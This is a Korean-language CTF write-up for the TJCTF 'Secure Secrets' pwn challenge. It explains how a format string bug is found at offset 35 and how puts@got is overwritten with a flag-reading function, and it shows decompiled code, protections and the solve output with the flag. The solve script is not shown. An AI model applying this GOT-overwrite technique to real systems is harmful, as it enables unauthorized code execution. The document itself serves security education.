`#FSB`
# Secure Secrets
110 points Binary Exploitation - Unsolved (105 solves)
Written by evanyeyeye

> I am responsible for architecting the most recent paradigm in our modern technological revolution: Secure Secrets. Why don't you [try](https://static.tjctf.org/521f71839cd9dfb7cc608497cef567f4942b849a017e28bb2e069fecfbab17fc_secure) it out?  
>  
> nc problem1.tjctf.org 8008  

```
345a9d40be02e662466031e5768fdd27  secure
```

## FSB
```
.text:080488EC                 push    [ebp+var_2C]    ; format
.text:080488EF                 call    _printf

  printf(a1);
```
바이너리를 분석해보면 printf 의 인자로 사용자가 입력할 수 있는 message 변수가 들어간다.  

```
> AAAA%35$p
AAAA0x41414141
```
실행시켜서 입출력을 비교해보면  
확실히 포맷스트링 버그가 존재하고 offset 35.  


## 시나리오
포맷스트링 버그로 `puts@got` 를  
`get_secret()`으로 덮어씌웁니다.  

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
```
  printf(a1);
  printf("\n");
  puts("Tada! Hope you liked our service!");
```
`puts@got`를 선정한 이유는  
printf 뒤에 puts 가 쓰였기 때문입니다.  

```
int get_secret()
{
  FILE *v1; // [sp+8h] [bp-50h]@1
  char v2; // [sp+Ch] [bp-4Ch]@3
  int v3; // [sp+4Ch] [bp-Ch]@1

  v3 = *MK_FP(__GS__, 20);
  v1 = fopen("flag.txt", "r");
  if ( v1 )
  {
    __isoc99_fscanf(v1, "%s", &v2);
    printf("Here is your secret: %s\n", &v2);
  }
  else
  {
    puts("Secret could not be accessed.");
  }
  return *MK_FP(__GS__, 20) ^ v3;
}
```
`get_secret()` 함수는 `flag.txt` 를 읽어주는 함수입니다.  

## 끝
```
# python solve.py
[+] Opening connection to problem1.tjctf.org on port 8008: Done
[+] Receiving all data: Done (327B)
[*] Closed connection to problem1.tjctf.org port 8008

(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0  L                                                                                                                                                                                                                                               \x87   h

Here is your secret: tjctf{n1c3_j0b_y0u_r34lly_GOT_m3_600d}

```
